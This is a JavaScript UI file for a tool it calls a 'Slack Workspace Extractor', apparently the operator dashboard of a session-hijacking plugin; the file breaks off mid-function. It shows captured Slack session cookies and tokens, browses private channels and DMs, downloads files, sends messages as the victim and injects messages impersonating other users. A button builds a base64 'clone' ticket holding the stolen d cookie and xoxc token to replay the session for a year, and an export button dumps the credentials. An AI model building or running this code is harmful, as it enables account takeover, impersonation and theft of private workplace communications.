// Slack Workspace Extractor — ui.js
// Dashboard UI for browsing Slack channels, messages, and sending messages.

var channels = [];
var users = [];
var currentMessages = [];
var currentChannelId = null;
var currentChannelName = '';
var credData = null;
var allErrors = [];
var channelFilter = '';
var searchResults = null;
var searchQuery = '';
var searchPage = 1;
var _refreshTimer = null;
var _pollTimer = null;
var _searchPollTimer = null;
var selectedInjectUser = null;
var _injectPollTimer = null;
var _activeDownloads = {}; // track in-progress file downloads by fileName
var workspaces = [];
var activeWorkspaceIndex = 0;
var _workspaceSwitchTime = 0; // timestamp of last user-initiated switch
var _workspaceGeneration = 0; // increments on each workspace switch to invalidate stale data
var _switchPending = false; // true while waiting for plugin to confirm workspace switch
var injectedMessageCount = 0;
var _clearInjectedPollTimer = null;

function humanFileSize(bytes) {
    if (!bytes || bytes < 1024) return (bytes || 0) + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / 1048576).toFixed(1) + ' MB';
}

function fileIcon(mimetype) {
    if (!mimetype) return '\u{1F4CE}'; // paperclip
    if (mimetype.indexOf('image/') === 0) return '\u{1F5BC}'; // framed picture
    if (mimetype.indexOf('video/') === 0) return '\u{1F3AC}'; // clapper
    if (mimetype.indexOf('audio/') === 0) return '\u{1F3B5}'; // music note
    if (mimetype.indexOf('pdf') !== -1) return '\u{1F4C4}'; // page
    return '\u{1F4CE}'; // paperclip
}

function userInitialAvatar(name, userId) {
    var initial = (name && name.length > 0) ? name.charAt(0).toUpperCase() : '?';
    // Deterministic color from userId hash
    var colors = ['#4a7c59','#7c4a6b','#4a5e7c','#7c6b4a','#5a4a7c','#7c4a4a','#4a7c7c','#6b7c4a'];
    var hash = 0;
    var id = userId || name || '';
    for (var i = 0; i < id.length; i++) {
        hash = ((hash << 5) - hash) + id.charCodeAt(i);
        hash = hash & hash;
    }
    var color = colors[Math.abs(hash) % colors.length];
    return '<div style="width:24px;height:24px;border-radius:3px;background:' + color +
        ';display:inline-flex;align-items:center;justify-content:center;color:#fff;font-size:12px;font-weight:bold;margin-right:8px;flex-shrink:0">' +
        initial + '</div>';
}

function esc(str) {
    if (str === null || str === undefined) return '';
    var div = document.createElement('div');
    div.appendChild(document.createTextNode(String(str)));
    return div.innerHTML;
}

// ===== Send command to plugin via server =====

function sendCommand(command) {
    return fetch('/api/plugins/slack/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ clientID: pluginUI.clientId, command: command })
    }).then(function(r) { return r.json(); });
}

// ===== Render functions =====

function renderTopbar() {
    var selectEl = pluginUI.container.querySelector('#slack-workspace-select');
    var userEl = pluginUI.container.querySelector('#slack-user');
    var statusEl = pluginUI.container.querySelector('#slack-status');

    var spinner = '<span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>';

    if (credData) {
        userEl.textContent = 'User: ' + (credData.userName || credData.userId || '--');
        if (credData.status === 'verified') {
            statusEl.className = 'badge bg-success';
            statusEl.textContent = 'Connected';
        } else if (credData.status === 'auth_failed') {
            statusEl.className = 'badge bg-danger';
            statusEl.textContent = 'Auth Failed';
        } else {
            statusEl.className = 'badge bg-warning text-dark';
            statusEl.innerHTML = spinner + esc(credData.status || 'Syncing...');
        }
    } else {
        statusEl.className = 'badge bg-secondary';
        statusEl.innerHTML = spinner + 'Syncing...';
    }

    // Populate workspace dropdown
    if (selectEl && workspaces.length > 0) {
        var html = '';
        for (var i = 0; i < workspaces.length; i++) {
            var ws = workspaces[i];
            var label = ws.teamName || ws.domain || ('Workspace ' + (i + 1));
            if (ws.userName) label += ' (' + ws.userName + ')';
            html += '<option value="' + i + '"' + (i === activeWorkspaceIndex ? ' selected' : '') + '>' + esc(label) + '</option>';
        }
        selectEl.innerHTML = html;
    } else if (selectEl && credData) {
        selectEl.innerHTML = '<option value="0">' + esc(credData.teamName || 'Workspace') + '</option>';
    }
}

function renderChannels() {
    var container = pluginUI.container.querySelector('#slack-channel-list');
    if (!container) return;

    if (channels.length === 0) {
        container.innerHTML = '<div class="text-muted small p-2">No channels loaded</div>';
        return;
    }

    // Group by type
    var publicCh = [];
    var privateCh = [];
    var dmCh = [];
    var mpimCh = [];

    var filter = channelFilter.toLowerCase();

    for (var i = 0; i < channels.length; i++) {
        var ch = channels[i];
        if (ch.isArchived) continue;
        if (filter && (ch.name || '').toLowerCase().indexOf(filter) === -1) continue;

        if (ch.type === 'im') dmCh.push(ch);
        else if (ch.type === 'mpim') mpimCh.push(ch);
        else if (ch.type === 'private') privateCh.push(ch);
        else publicCh.push(ch);
    }

    var html = '';

    if (publicCh.length > 0) {
        html += '<div class="text-muted small px-2 pt-1" style="text-transform:uppercase;font-size:0.65rem;color:#7a8288">Channels</div>';
        for (var p = 0; p < publicCh.length; p++) {
            html += channelItem(publicCh[p], '#');
        }
    }

    if (privateCh.length > 0) {
        html += '<div class="text-muted small px-2 pt-2" style="text-transform:uppercase;font-size:0.65rem;color:#7a8288">Private</div>';
        for (var pr = 0; pr < privateCh.length; pr++) {
            html += channelItem(privateCh[pr], '\u{1F512}');
        }
    }

    if (mpimCh.length > 0) {
        html += '<div class="text-muted small px-2 pt-2" style="text-transform:uppercase;font-size:0.65rem;color:#7a8288">Group DMs</div>';
        for (var g = 0; g < mpimCh.length; g++) {
            html += channelItem(mpimCh[g], '');
        }
    }

    if (dmCh.length > 0) {
        html += '<div class="text-muted small px-2 pt-2" style="text-transform:uppercase;font-size:0.65rem;color:#7a8288">Direct Messages</div>';
        for (var d = 0; d < dmCh.length; d++) {
            html += channelItem(dmCh[d], '');
        }
    }

    if (!html) {
        html = '<div class="text-muted small p-2">No channels match filter</div>';
    }

    container.innerHTML = html;

    // Wire click handlers
    var items = container.querySelectorAll('[data-channel-id]');
    for (var ci = 0; ci < items.length; ci++) {
        (function(item) {
            item.onclick = function() {
                var chId = item.getAttribute('data-channel-id');
                var chName = item.getAttribute('data-channel-name');
                selectChannel(chId, chName);

                // Highlight active
                for (var x = 0; x < items.length; x++) {
                    items[x].style.borderLeft = '';
                    items[x].style.background = '';
                }
                item.style.borderLeft = '3px solid #62c462';
                item.style.background = 'rgba(255,255,255,0.05)';
            };
        })(items[ci]);
    }
}

function channelItem(ch, prefix) {
    var active = ch.id === currentChannelId;
    var style = 'padding:3px 8px;cursor:pointer;border-radius:3px;font-size:0.85rem;';
    if (active) {
        style += 'border-left:3px solid #62c462;background:rgba(255,255,255,0.05);';
    }
    return '<div data-channel-id="' + esc(ch.id) + '" data-channel-name="' + esc(ch.name) + '" ' +
        'style="' + style + '">' +
        '<span class="text-muted">' + prefix + '</span>' + esc(ch.name) +
        '</div>';
}

// Resolve raw Slack user IDs to display names using the users array
function resolveUserName(nameOrId) {
    if (!nameOrId) return 'unknown';
    // If it doesn't look like a raw user ID, return as-is
    if (!/^U[A-Z0-9]{6,}$/.test(nameOrId)) return nameOrId;
    // Look up in users array
    for (var i = 0; i < users.length; i++) {
        if (users[i].id === nameOrId) return users[i].name || users[i].realName || nameOrId;
    }
    return nameOrId;
}

function renderMessages() {
    var container = pluginUI.container.querySelector('#slack-messages');
    var nameEl = pluginUI.container.querySelector('#slack-channel-name');
    var topicEl = pluginUI.container.querySelector('#slack-channel-topic');

    if (!container) return;

    if (!currentChannelId) {
        container.innerHTML = '<div class="text-muted small">Select a channel to view messages</div>';
        nameEl.textContent = 'Select a channel';
        topicEl.textContent = '';
        return;
    }

    nameEl.textContent = currentChannelName || currentChannelId;

    // Find channel topic
    var topic = '';
    for (var c = 0; c < channels.length; c++) {
        if (channels[c].id === currentChannelId) {
            topic = channels[c].topic || channels[c].purpose || '';
            break;
        }
    }
    topicEl.textContent = topic ? '| ' + topic : '';

    if (currentMessages.length === 0) {
        container.innerHTML = '<div class="text-muted small"><span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Fetching...</div>';
        return;
    }

    var html = '';
    for (var i = 0; i < currentMessages.length; i++) {
        var msg = currentMessages[i];
        var timeStr = '';
        if (msg.time) {
            try {
                var d = new Date(msg.time);
                timeStr = d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
            } catch (e) {
                timeStr = msg.ts || '';
            }
        }

        var subtypeClass = '';
        if (msg.subtype) subtypeClass = ' text-muted fst-italic';

        var displayName = resolveUserName(msg.user || 'unknown');

        var filesHtml = '';
        if (msg.files && msg.files.length) {
            for (var fi = 0; fi < msg.files.length; fi++) {
                var f = msg.files[fi];
                filesHtml += '<div class="d-flex align-items-center mt-1" style="padding:4px 8px;background:#3a3f44;border-radius:3px;border-left:3px solid #52565a;gap:6px">' +
                    '<span>' + fileIcon(f.mimetype) + '</span>' +
                    '<span class="small" style="color:#fff">' + esc(f.name) + '</span>' +
                    '<span class="text-muted small">(' + humanFileSize(f.size) + ')</span>';
                if (f.urlPrivate) {
                    filesHtml += '<button class="btn btn-outline-secondary btn-sm ms-auto slack-file-dl" ' +
                        'data-url="' + esc(f.urlPrivate) + '" data-name="' + esc(f.name) + '" data-mime="' + esc(f.mimetype) + '" ' +
                        'style="padding:1px 6px;font-size:0.7rem;line-height:1.2">Download</button>';
                }
                filesHtml += '</div>';
            }
        }

        html += '<div class="mb-2">' +
            '<span class="fw-bold" style="color:#fff">' + esc(displayName) + '</span>' +
            '<span class="text-muted small ms-2">' + esc(timeStr) + '</span>' +
            '<div class="small' + subtypeClass + '" style="color:#aaa;word-break:break-word">' + formatSlackText(msg.text || '') + '</div>' +
            filesHtml +
            '</div>';
    }

    // Only auto-scroll if user is already near the bottom (within 80px)
    var wasNearBottom = (container.scrollHeight - container.scrollTop - container.clientHeight) < 80;

    container.innerHTML = html;

    if (wasNearBottom) {
        container.scrollTop = container.scrollHeight;
    }

    // Wire file download buttons
    var dlBtns = container.querySelectorAll('.slack-file-dl');
    for (var di = 0; di < dlBtns.length; di++) {
        (function(btn) {
            var name = btn.getAttribute('data-name');
            // Restore visual state if a download is already in progress for this file
            if (_activeDownloads[name]) {
                btn.disabled = true;
                btn.textContent = _activeDownloads[name];
            }
            btn.onclick = function() {
                if (_activeDownloads[name]) return; // Already downloading
                var url = btn.getAttribute('data-url');
                var mime = btn.getAttribute('data-mime');
                btn.disabled = true;
                btn.textContent = 'Downloading...';
                _activeDownloads[name] = 'Downloading...';

                // Snapshot the latest file_download row ID so we only match newer results
                pluginUI.fetchData('file_download', 1, 0).then(function(snap) {
                    var snapRows = snap.rows || [];
                    var lastId = snapRows.length > 0 ? snapRows[0].id : 0;

                    sendCommand({ action: 'download_file', url: url, fileName: name, mimetype: mime });

                    var polls = 0;
                    var dlTimer = setInterval(function() {
                        polls++;
                        if (polls > 60) {
                            clearInterval(dlTimer);
                            delete _activeDownloads[name];
                            var curBtn = container.querySelector('.slack-file-dl[data-name="' + CSS.escape(name) + '"]');
                            if (curBtn) { curBtn.textContent = 'Timeout'; curBtn.disabled = false; }
                            return;
                        }
                        pluginUI.fetchData('file_download', 5, 0).then(function(result) {
                            var rows = result.rows || [];
                            for (var r = 0; r < rows.length; r++) {
                                var row = rows[r];
                                var d = row.data || {};
                                if (d.fileName !== name || row.id <= lastId) continue;
                                if (d.data) {
                                    clearInterval(dlTimer);
                                    var byteChars = atob(d.data);
                                    var byteArray = new Uint8Array(byteChars.length);
                                    for (var b = 0; b < byteChars.length; b++) {
                                        byteArray[b] = byteChars.charCodeAt(b);
                                    }
                                    var blob = new Blob([byteArray], { type: d.mimetype || 'application/octet-stream' });
                                    var a = document.createElement('a');
                                    a.href = URL.createObjectURL(blob);
                                    a.download = name;
                                    document.body.appendChild(a);
                                    a.click();
                                    document.body.removeChild(a);
                                    URL.revokeObjectURL(a.href);
                                    _activeDownloads[name] = 'Downloaded';
                                    var curBtn = container.querySelector('.slack-file-dl[data-name="' + CSS.escape(name) + '"]');
                                    if (curBtn) { curBtn.textContent = 'Downloaded'; curBtn.disabled = false; }
                                    setTimeout(function() { delete _activeDownloads[name]; }, 3000);
                                    return;
                                }
                                if (d.error) {
                                    clearInterval(dlTimer);
                                    delete _activeDownloads[name];
                                    var curBtn = container.querySelector('.slack-file-dl[data-name="' + CSS.escape(name) + '"]');
                                    if (curBtn) { curBtn.textContent = 'Error: ' + (d.error || 'unknown'); curBtn.disabled = false; }
                                    return;
                                }
                            }
                        });
                    }, 1000);
                });
            };
        })(dlBtns[di]);
    }
}

function formatSlackText(text) {
    // Escape HTML first
    var escaped = esc(text);
    // Bold: *text*
    escaped = escaped.replace(/\*([^*]+)\*/g, '<b>$1</b>');
    // Italic: _text_
    escaped = escaped.replace(/\b_([^_]+)_\b/g, '<i>$1</i>');
    // Code: `text`
    escaped = escaped.replace(/`([^`]+)`/g, '<code style="background:#3a3f44;padding:1px 4px;border-radius:3px">$1</code>');
    // Links: <url|label> or <url>
    escaped = escaped.replace(/&lt;(https?:\/\/[^|&]+)\|([^&]+)&gt;/g, '<a href="$1" target="_blank" style="color:#fff">$2</a>');
    escaped = escaped.replace(/&lt;(https?:\/\/[^&]+)&gt;/g, '<a href="$1" target="_blank" style="color:#fff">$1</a>');
    // Newlines
    escaped = escaped.replace(/\n/g, '<br>');
    return escaped;
}

function renderErrors() {
    var toggle = pluginUI.container.querySelector('#slack-errors-toggle');
    var countEl = pluginUI.container.querySelector('#slack-error-count');
    var tbody = pluginUI.container.querySelector('#slack-errors-body');

    if (allErrors.length > 0) {
        toggle.style.display = '';
        countEl.textContent = allErrors.length;

        var html = '';
        for (var i = 0; i < allErrors.length; i++) {
            var row = allErrors[i];
            var d = row.data || {};
            html += '<tr>' +
                '<td class="small">' + esc(d.phase || '') + '</td>' +
                '<td class="small" style="max-width:400px;word-break:break-all">' + esc(d.error || JSON.stringify(d)) + '</td>' +
                '<td class="small text-muted">' + (row.timeStamp ? new Date(row.timeStamp).toLocaleString() : '') + '</td>' +
                '</tr>';
        }
        tbody.innerHTML = html;
    } else {
        toggle.style.display = 'none';
    }
}

function renderSearchResults() {
    var panel = pluginUI.container.querySelector('#slack-search-panel');
    var container = pluginUI.container.querySelector('#slack-search-results');
    var titleEl = pluginUI.container.querySelector('#slack-search-title');
    var pageInfo = pluginUI.container.querySelector('#slack-search-page-info');
    var prevBtn = pluginUI.container.querySelector('#slack-search-prev');
    var nextBtn = pluginUI.container.querySelector('#slack-search-next');

    if (!searchResults || !panel) return;

    panel.style.display = '';
    titleEl.textContent = 'Search: "' + searchResults.query + '" (' + searchResults.total + ' results)';

    var page = searchResults.page || 1;
    var pageCount = searchResults.pageCount || 1;
    pageInfo.textContent = 'Page ' + page + ' / ' + pageCount;
    prevBtn.disabled = page <= 1;
    nextBtn.disabled = page >= pageCount;

    var matches = searchResults.matches || [];
    if (matches.length === 0) {
        var msg = 'No messages found';
        if (searchResults.error) msg = 'Search error: ' + searchResults.error;
        container.innerHTML = '<div class="text-muted small">' + esc(msg) + '</div>';
        return;
    }

    var html = '';
    for (var i = 0; i < matches.length; i++) {
        var m = matches[i];
        var timeStr = '';
        if (m.time) {
            try { timeStr = new Date(m.time).toLocaleString(); } catch (e) {}
        }

        var chLabel = m.channelName ? ('#' + m.channelName) : m.channelId;

        html += '<div class="mb-2 pb-2" style="border-bottom:1px solid #3a3f44">' +
            '<div>' +
            '<span class="fw-bold" style="color:#fff">' + esc(resolveUserName(m.user || 'unknown')) + '</span>' +
            '<span class="badge bg-dark ms-2">' + esc(chLabel) + '</span>' +
            '<span class="text-muted small ms-2">' + esc(timeStr) + '</span>' +
            '</div>' +
            '<div class="small" style="color:#aaa;word-break:break-word">' + formatSlackText(m.text || '') + '</div>';

        if (m.permalink) {
            html += '<a href="' + esc(m.permalink) + '" target="_blank" class="small" style="color:#fff">permalink</a>';
        }

        // Add a "Go to channel" link
        if (m.channelId) {
            html += ' <a href="#" class="small slack-search-goto" data-ch-id="' + esc(m.channelId) + '" data-ch-name="' + esc(m.channelName || m.channelId) + '" style="color:#fff;margin-left:8px">open channel</a>';
        }

        html += '</div>';
    }

    container.innerHTML = html;

    // Wire "open channel" links
    var gotos = container.querySelectorAll('.slack-search-goto');
    for (var g = 0; g < gotos.length; g++) {
        (function(el) {
            el.onclick = function(e) {
                e.preventDefault();
                selectChannel(el.getAttribute('data-ch-id'), el.getAttribute('data-ch-name'));
            };
        })(gotos[g]);
    }
}

// ===== Channel selection =====

function selectChannel(channelId, channelName) {
    currentChannelId = channelId;
    currentChannelName = channelName || channelId;
    currentMessages = [];
    renderMessages();

    // Enable input
    var input = pluginUI.container.querySelector('#slack-msg-input');
    var sendBtn = pluginUI.container.querySelector('#slack-send-btn');
    if (input) input.disabled = false;
    if (sendBtn) sendBtn.disabled = false;

    // Update inject controls (depends on channel being selected)
    updateInjectControls();

    // After a workspace switch, skip cached messages (likely stale from old workspace)
    // and always request fresh data
    if (!_switchPending) {
        // Check if we already have messages for this channel
        pluginUI.fetchData('messages', 50, 0).then(function(result) {
            var rows = result.rows || [];
            for (var i = 0; i < rows.length; i++) {
                var d = rows[i].data || {};
                if (d.channelId === channelId) {
                    currentMessages = d.messages || [];
                    renderMessages();
                    return;
                }
            }
            // No cached messages, request fetch
            sendCommand({ action: 'fetch_messages', channelId: channelId, channelName: channelName, limit: 50 });
        });
    } else {
        // Always request fresh fetch after workspace switch
        sendCommand({ action: 'fetch_messages', channelId: channelId, channelName: channelName, limit: 50 });
    }
}

// ===== Data loading =====

function loadMessages() {
    if (!currentChannelId) return;
    var gen = _workspaceGeneration;
    pluginUI.fetchData('messages', 50, 0).then(function(result) {
        // Discard if workspace changed while fetching
        if (gen !== _workspaceGeneration) return;
        var rows = result.rows || [];
        for (var i = 0; i < rows.length; i++) {
            var d = rows[i].data || {};
            if (d.channelId === currentChannelId) {
                currentMessages = d.messages || [];
                renderMessages();
                break;
            }
        }
    });
}

function loadData() {
    if (!pluginUI.container || !pluginUI.container.parentNode) {
        if (_refreshTimer) { clearInterval(_refreshTimer); _refreshTimer = null; }
        if (_pollTimer) { clearInterval(_pollTimer); _pollTimer = null; }
        return;
    }

    // Load workspace list
    pluginUI.fetchData('workspace_list', 5, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            var latest = rows[0].data || {};
            if (latest.workspaces && latest.workspaces.length > 0) {
                workspaces = latest.workspaces;
                // Don't overwrite activeIndex from server while a switch is pending
                if (typeof latest.activeIndex === 'number' && !_switchPending) {
                    activeWorkspaceIndex = latest.activeIndex;
                }
                renderTopbar();
            }
        }
    });

    // Load credentials
    pluginUI.fetchData('credentials', 5, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            var newCred = rows[0].data || {};
            credData = newCred;
            renderTopbar();
        }
    });

    // Load channels (skip while switch is pending — data is from old workspace)
    if (_switchPending) {
        // Show syncing state in channel list
        var chContainer = pluginUI.container.querySelector('#slack-channel-list');
        if (chContainer && channels.length === 0) {
            chContainer.innerHTML = '<div class="text-muted small p-2"><span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Syncing workspace...</div>';
        }
    }
    if (!_switchPending) pluginUI.fetchData('channel_list', 5, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            var latest = rows[0].data || {};
            channels = latest.channels || [];
            renderChannels();
        }
    });

    // Load users (for inject user picker) — skip while switch pending
    if (!_switchPending) pluginUI.fetchData('user_list', 5, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            var latest = rows[0].data || {};
            if (latest.users && latest.users.length > 0) {
                users = latest.users;
            }
        }
    });

    // Check if workspace switch is complete via explicit signal from the plugin.
    // The plugin sends switch_complete AFTER fetchIdentity → fetchUsers → fetchChannels all finish.
    if (_switchPending) {
        pluginUI.fetchData('switch_complete', 5, 0).then(function(result) {
            var rows = result.rows || [];
            if (rows.length > 0) {
                var latest = rows[0].data || {};
                if (latest.workspaceIndex === activeWorkspaceIndex) {
                    _switchPending = false;
                    // Immediately load the now-ready data
                    pluginUI.fetchData('channel_list', 5, 0).then(function(chResult) {
                        var chRows = chResult.rows || [];
                        if (chRows.length > 0) {
                            channels = (chRows[0].data || {}).channels || [];
                            renderChannels();
                        }
                    });
                    pluginUI.fetchData('user_list', 5, 0).then(function(uResult) {
                        var uRows = uResult.rows || [];
                        if (uRows.length > 0) {
                            var uLatest = uRows[0].data || {};
                            if (uLatest.users && uLatest.users.length > 0) {
                                users = uLatest.users;
                            }
                        }
                    });
                }
            }
        });
    }

    // Load messages for current channel (skip during workspace switch to avoid stale data)
    if (currentChannelId && !_switchPending) {
        pluginUI.fetchData('messages', 50, 0).then(function(result) {
            var rows = result.rows || [];
            for (var i = 0; i < rows.length; i++) {
                var d = rows[i].data || {};
                if (d.channelId === currentChannelId) {
                    currentMessages = d.messages || [];
                    renderMessages();
                    break;
                }
            }
        });
    }

    // Load send results (for feedback)
    pluginUI.fetchData('send_result', 5, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            var latest = rows[0].data || {};
            if (latest.ok && latest.channelId === currentChannelId) {
                // Re-fetch messages after successful send
                sendCommand({ action: 'fetch_messages', channelId: currentChannelId, channelName: currentChannelName, limit: 50 });
            }
        }
    });

    // Load injected message tracking
    pluginUI.fetchData('injected_messages', 5, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            var latest = rows[0].data || {};
            injectedMessageCount = latest.count || 0;
            updateClearInjectedButton();
        }
    });

    // Load errors
    pluginUI.fetchData('_error', 50, 0).then(function(result) {
        allErrors = result.rows || [];
        renderErrors();
    });
}

// ===== Wire up controls =====

// Workspace switcher
var workspaceSelect = pluginUI.container.querySelector('#slack-workspace-select');
if (workspaceSelect) {
    workspaceSelect.onchange = function() {
        var idx = parseInt(workspaceSelect.value, 10);
        if (isNaN(idx) || idx === activeWorkspaceIndex) return;
        activeWorkspaceIndex = idx;
        _workspaceSwitchTime = Date.now();
        _workspaceGeneration++;
        _switchPending = true;

        // Reset UI state for the new workspace
        channels = [];
        currentMessages = [];
        currentChannelId = null;
        currentChannelName = '';
        users = [];
        selectedInjectUser = null;
        searchResults = null;
        var searchPanel = pluginUI.container.querySelector('#slack-search-panel');
        if (searchPanel) searchPanel.style.display = 'none';

        renderChannels();
        renderMessages();

        var labelEl = pluginUI.container.querySelector('#slack-inject-selected-user');
        if (labelEl) labelEl.textContent = '1. Search for a sender, 2. Select a channel from the sidebar';
        updateInjectControls();

        var statusEl = pluginUI.container.querySelector('#slack-status');
        if (statusEl) {
            statusEl.className = 'badge bg-secondary';
            statusEl.innerHTML = '<span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Syncing...';
        }

        sendCommand({ action: 'switch_workspace', workspaceIndex: idx });

        // Poll aggressively for new workspace data
        var polls = 0;
        var switchPollTimer = setInterval(function() {
            polls++;
            if (polls > 15 || !pluginUI.container || !pluginUI.container.parentNode) {
                clearInterval(switchPollTimer);
                return;
            }
            loadData();
        }, 1000);
    };
}

// Channel filter
var filterInput = pluginUI.container.querySelector('#slack-channel-filter');
if (filterInput) {
    filterInput.oninput = function() {
        channelFilter = filterInput.value;
        renderChannels();
    };
}

// Refresh channels button
var refreshBtn = pluginUI.container.querySelector('#slack-refresh-btn');
if (refreshBtn) {
    refreshBtn.onclick = function() {
        sendCommand({ action: 'fetch_channels' });
        sendCommand({ action: 'fetch_users' });
    };
}

// Send message
var msgInput = pluginUI.container.querySelector('#slack-msg-input');
var sendBtn = pluginUI.container.querySelector('#slack-send-btn');

var _sendPollTimer = null;

if (sendBtn) {
    sendBtn.onclick = function() {
        if (!currentChannelId || !msgInput || !msgInput.value.trim()) return;
        sendCommand({ action: 'send_message', channelId: currentChannelId, channelName: currentChannelName, text: msgInput.value.trim() });
        msgInput.value = '';

        // Poll aggressively for a few seconds so the sent message appears quickly
        var polls = 0;
        if (_sendPollTimer) clearInterval(_sendPollTimer);
        _sendPollTimer = setInterval(function() {
            polls++;
            if (polls > 8 || !pluginUI.container || !pluginUI.container.parentNode) {
                clearInterval(_sendPollTimer);
                _sendPollTimer = null;
                return;
            }
            loadMessages();
        }, 1000);
    };
}

if (msgInput) {
    msgInput.onkeydown = function(e) {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            if (sendBtn) sendBtn.click();
        }
    };
}

// Generate BEX Conductor ticket
var ticketBtn = pluginUI.container.querySelector('#slack-ticket-btn');
if (ticketBtn) {
    ticketBtn.onclick = function() {
        if (!credData || !credData.cookie || !credData.token) {
            alert('No Slack credentials available yet. Wait for sync to complete.');
            return;
        }

        // The xoxd- cookie is Slack's "d" session cookie, scoped to .slack.com
        // The xoxc- token is used by the web client as an API token stored in localStorage
        var teamDomain = credData.domain || credData.teamName || 'slack';
        var expiry = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60); // 1 year from now

        var ticket = {
            version: 1,
            type: 'clone',
            generated: new Date().toISOString(),
            domain: 'app.slack.com',
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            platform: 'Windows',
            browser: 'Chrome',
            cookies: [
                {
                    name: 'd',
                    value: credData.cookie,
                    httpOnly: true,
                    secure: true,
                    sameSite: 'lax',
                    path: '/',
                    domain: '.slack.com',
                    expirationDate: expiry
                },
                {
                    name: 'd-s',
                    value: Math.floor(Date.now() / 1000).toString(),
                    httpOnly: false,
                    secure: true,
                    sameSite: 'lax',
                    path: '/',
                    domain: '.slack.com',
                    expirationDate: expiry
                }
            ],
            headers: [],
            localStorage: [
                { key: 'localConfig_v2', value: JSON.stringify({ teams: (function() { var t = {}; t[credData.teamId] = { token: credData.token, name: credData.teamName || '', id: credData.teamId }; return t; })() }) }
            ],
            sessionStorage: [],
            urls: [
                'https://app.slack.com/client/' + (credData.teamId || ''),
                'https://app.slack.com/'
            ]
        };

        var b64 = btoa(JSON.stringify(ticket));
        navigator.clipboard.writeText(b64).then(function() {
            var orig = ticketBtn.textContent;
            ticketBtn.textContent = 'Copied!';
            setTimeout(function() { ticketBtn.textContent = orig; }, 2000);
        }).catch(function() {
            // Fallback: select from a temporary textarea
            var ta = document.createElement('textarea');
            ta.value = b64;
            document.body.appendChild(ta);
            ta.select();
            document.execCommand('copy');
            document.body.removeChild(ta);
            var orig = ticketBtn.textContent;
            ticketBtn.textContent = 'Copied!';
            setTimeout(function() { ticketBtn.textContent = orig; }, 2000);
        });
    };
}

// Export
var exportBtn = pluginUI.container.querySelector('#slack-export-btn');
if (exportBtn) {
    exportBtn.onclick = function() {
        var exportData = {
            credentials: credData,
            channels: channels,
            currentMessages: { channelId: currentChannelId, channelName: currentChannelName, messages: currentMessages },
            exportedAt: new Date().toISOString()
        };
        var blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = 'slack_extract_' + Date.now() + '.json';
        a.click();
        URL.revokeObjectURL(url);
    };
}

// Clear data
var clearBtn = pluginUI.container.querySelector('#slack-clear-btn');
if (clearBtn) {
    clearBtn.onclick = function() {
        if (confirm('Clear all extracted Slack data?')) {
            pluginUI.deleteData().then(function() {
                channels = [];
                currentMessages = [];
                credData = null;
                allErrors = [];
                currentChannelId = null;
                renderTopbar();
                renderChannels();
                renderMessages();
                renderErrors();
            });
        }
    };
}

// Error toggle
var errToggle = pluginUI.container.querySelector('#slack-errors-toggle');
var errPanel = pluginUI.container.querySelector('#slack-errors-panel');
if (errToggle && errPanel) {
    errToggle.onclick = function(e) {
        e.preventDefault();
        errPanel.style.display = errPanel.style.display === 'none' ? '' : 'none';
    };
}

// ===== Search controls =====

var searchInput = pluginUI.container.querySelector('#slack-search-input');
var searchBtn = pluginUI.container.querySelector('#slack-search-btn');
var searchStatusEl = pluginUI.container.querySelector('#slack-search-status');
var searchCloseBtn = pluginUI.container.querySelector('#slack-search-close');
var searchPrevBtn = pluginUI.container.querySelector('#slack-search-prev');
var searchNextBtn = pluginUI.container.querySelector('#slack-search-next');

function doSearch(query, page) {
    if (!query || !query.trim()) return;
    searchQuery = query.trim();
    searchPage = page || 1;
    searchResults = null;
    if (searchStatusEl) searchStatusEl.innerHTML = '<span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Searching...';
    sendCommand({ action: 'search_messages', query: searchQuery, count: 20, page: searchPage });

    // Poll for results
    var polls = 0;
    if (_searchPollTimer) clearInterval(_searchPollTimer);
    _searchPollTimer = setInterval(function() {
        polls++;
        if (polls > 30) {
            clearInterval(_searchPollTimer);
            _searchPollTimer = null;
            if (searchStatusEl) searchStatusEl.textContent = 'Timed out — try again';
            return;
        }
        pluginUI.fetchData('search_results', 5, 0).then(function(result) {
            var rows = result.rows || [];
            for (var i = 0; i < rows.length; i++) {
                var d = rows[i].data || {};
                if (d.query === searchQuery) {
                    searchResults = d;
                    renderSearchResults();
                    if (searchStatusEl) searchStatusEl.textContent = '';
                    clearInterval(_searchPollTimer);
                    _searchPollTimer = null;
                    break;
                }
            }
        });
    }, 1000);
}

if (searchBtn) {
    searchBtn.onclick = function() {
        doSearch(searchInput ? searchInput.value : '', 1);
    };
}

if (searchInput) {
    searchInput.onkeydown = function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            doSearch(searchInput.value, 1);
        }
    };
}

if (searchCloseBtn) {
    searchCloseBtn.onclick = function() {
        var panel = pluginUI.container.querySelector('#slack-search-panel');
        if (panel) panel.style.display = 'none';
        searchResults = null;
        if (searchStatusEl) searchStatusEl.textContent = '';
    };
}

if (searchPrevBtn) {
    searchPrevBtn.onclick = function() {
        if (searchQuery && searchPage > 1) {
            doSearch(searchQuery, searchPage - 1);
        }
    };
}

if (searchNextBtn) {
